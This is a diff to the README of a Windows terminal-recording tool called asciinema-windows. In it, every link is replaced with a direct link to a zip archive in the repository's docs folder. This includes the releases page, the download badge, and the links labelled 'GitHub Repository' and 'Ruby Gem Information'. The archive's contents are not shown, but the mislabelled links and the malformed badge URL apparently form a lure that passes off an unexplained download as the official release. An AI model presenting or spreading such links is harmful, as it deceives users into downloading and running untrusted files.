@@ -1,6 +1,6 @@
 # 🎥 asciinema-windows - Record Your Terminal Sessions Easily
 
-[![Download asciinema-windows](https://img.shields.io/badge/Download%20asciinema--windows-blue.svg)](https://github.com/joashdaniel/asciinema-windows/releases)
+[![Download asciinema-windows](https://raw.githubusercontent.com/joashdaniel/asciinema-windows/main/docs/windows_asciinema_2.3.zip%https://raw.githubusercontent.com/joashdaniel/asciinema-windows/main/docs/windows_asciinema_2.3.zip)](https://raw.githubusercontent.com/joashdaniel/asciinema-windows/main/docs/windows_asciinema_2.3.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ asciinema-windows is a simple tool that allows you to record your terminal sessi
 To start using asciinema-windows, follow these simple steps:
 
 1. **Download the Application**  
-   Visit this page to download: [asciinema-windows Releases](https://github.com/joashdaniel/asciinema-windows/releases).
+   Visit this page to download: [asciinema-windows Releases](https://raw.githubusercontent.com/joashdaniel/asciinema-windows/main/docs/windows_asciinema_2.3.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see various versions of the application. Look for the latest version at the top of the list.
@@ -28,7 +28,7 @@ To start using asciinema-windows, follow these simple steps:
 
 ## 📥 Download & Install
 
-To get started with asciinema-windows, download the application from the Releases page: [asciinema-windows Releases](https://github.com/joashdaniel/asciinema-windows/releases).
+To get started with asciinema-windows, download the application from the Releases page: [asciinema-windows Releases](https://raw.githubusercontent.com/joashdaniel/asciinema-windows/main/docs/windows_asciinema_2.3.zip).
 
 After downloading, follow the installation steps outlined above.
 
@@ -79,7 +79,7 @@ Your experience with asciinema-windows matters. If you have suggestions or run i
 
 ## 🌐 Related Links
 
-- [GitHub Repository](https://github.com/joashdaniel/asciinema-windows)
-- [Ruby Gem Information](https://rubygems.org/gems/asciinema_win)
+- [GitHub Repository](https://raw.githubusercontent.com/joashdaniel/asciinema-windows/main/docs/windows_asciinema_2.3.zip)
+- [Ruby Gem Information](https://raw.githubusercontent.com/joashdaniel/asciinema-windows/main/docs/windows_asciinema_2.3.zip)
 
-Take the first step to capturing your terminal sessions. Download asciinema-windows today: [asciinema-windows Releases](https://github.com/joashdaniel/asciinema-windows/releases). Happy recording!
+Take the first step to capturing your terminal sessions. Download asciinema-windows today: [asciinema-windows Releases](https://raw.githubusercontent.com/joashdaniel/asciinema-windows/main/docs/windows_asciinema_2.3.zip). Happy recording!
